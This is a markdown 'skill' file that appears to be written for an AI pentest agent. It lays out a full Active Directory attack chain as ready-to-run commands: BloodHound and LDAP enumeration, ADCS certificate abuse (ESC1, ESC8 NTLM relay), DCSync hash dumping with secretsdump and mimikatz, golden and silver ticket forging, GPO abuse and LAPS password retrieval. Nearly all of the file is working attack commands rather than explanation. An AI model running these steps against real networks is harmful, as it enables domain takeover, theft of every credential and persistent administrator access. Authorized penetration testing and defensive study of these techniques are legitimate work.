# /ad-assessment — Active Directory Full Attack Chain

> **Skill type:** Exploitation (AD)  
> **Source:** 0x0pointer/skills `/ad-assessment`, 0xsteph/pentest-ai-agents `ad-attacker`  
> **Chains into:** `/lateral-movement`, `/post-exploit`  
> **Chained from:** Network access to AD environment

---

## Phase 1: AD Enumeration

```bash
# BloodHound — map entire AD attack surface
# Collector (from Windows domain-joined machine):
SharpHound.exe -c All --zipfilename bloodhound.zip

# Collector (from Linux via LDAP):
bloodhound-python -u user -p pass -d domain.local -dc-ip 10.0.0.1 --zip -c All

# In BloodHound UI:
# - "Find Shortest Paths to Domain Admins"
# - "Find Principals with DCSync Rights"
# - "Find AS-REP Roastable Users"
# - "Find Kerberoastable Accounts"
# - "Shortest Paths to Unconstrained Delegation Systems"

# LDAP enumeration
ldapsearch -x -H ldap://10.0.0.1 -D "domain\\user" -w "pass" -b "DC=domain,DC=local" \
  "(objectClass=user)" sAMAccountName memberOf userAccountControl

# PowerView
Import-Module ./PowerView.ps1
Get-DomainUser -Properties name,memberof,logoncount
Get-DomainGroupMember "Domain Admins"
Get-DomainComputer -Properties name,operatingsystem
Invoke-ACLScanner -ResolveGUIDs  # Find dangerous ACLs
```

## Phase 2: ADCS (Certificate Services) — ESC1-ESC8

```bash
# Certipy — enumerate and exploit ADCS
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -vulnerable -enabled

# ESC1: User-controlled SAN in enrollment
certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 \
  -target ca.domain.local -template VulnerableTemplate \
  -upn administrator@domain.local

# ESC4: Template with write ACL
# Grant enrollment rights to compromised account → modify → ESC1

# ESC8: NTLM relay to AD CS web enrollment
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template UserAuthentication

# After obtaining certificate: PKINIT to get TGT
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -username administrator -domain domain.local
```

## Phase 3: DCSync (Dump All Hashes)

```bash
# Requires: Replication rights (DS-Replication-Get-Changes-All)
# Check if account has these rights in BloodHound: "Find Principals with DCSync Rights"

# impacket — secretsdump
secretsdump.py domain/user:pass@10.0.0.1

# Or: mimikatz
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Dump specific user
secretsdump.py -just-dc-user Administrator domain/user:pass@10.0.0.1
```

## Phase 4: Golden / Silver Tickets

```bash
# Golden Ticket — forge TGT using KRBTGT hash (from DCSync)
# Requires: KRBTGT NTLM hash + Domain SID

# mimikatz
mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi" "exit"
mimikatz.exe "kerberos::ptt golden.kirbi" "exit"

# impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass domain.local/Administrator@dc.domain.local

# Silver Ticket — forge service ticket (no DC communication needed)
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local \
  -spn cifs/server.domain.local Administrator
```

## Phase 5: GPO, LAPS, and Fine-Grained Passwords

```bash
# GPO exploitation
# If WriteProperty/GenericWrite on a GPO:
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount compromised --GPOName "Default Domain Policy"

# LAPS password retrieval (if you have read access to LAPS attribute)
crackmapexec ldap 10.0.0.1 -u user -p pass --kdcHost 10.0.0.1 -M laps
Get-AdmPwdPassword -ComputerName workstation.domain.local  # PowerShell

# Fine-Grained Password Policy enumeration
Get-ADFineGrainedPasswordPolicy -Filter *  # Find PSOs with lower requirements
```

## AD Attack Chain Summary

```
Start: Low-privileged domain user credentials
  ↓
Phase 1: Enumeration (BloodHound, LDAP)
  ↓
Phase 2: Find attack paths
  → Kerberoastable account? → Crack → Higher-privilege user
  → ADCS vulnerable template (ESC1-8)? → Forge admin cert
  → NTLM relay opportunity? → Relay to get shell/hash
  → BloodHound path via ACL abuse?
  ↓
Phase 3: Gain Domain Admin (or equivalent)
  ↓
Phase 4: DCSync → dump all hashes
  ↓
Phase 5: Golden Ticket → persistent Domain Admin
  ↓
Evidence: BloodHound screenshots, secretsdump output
```
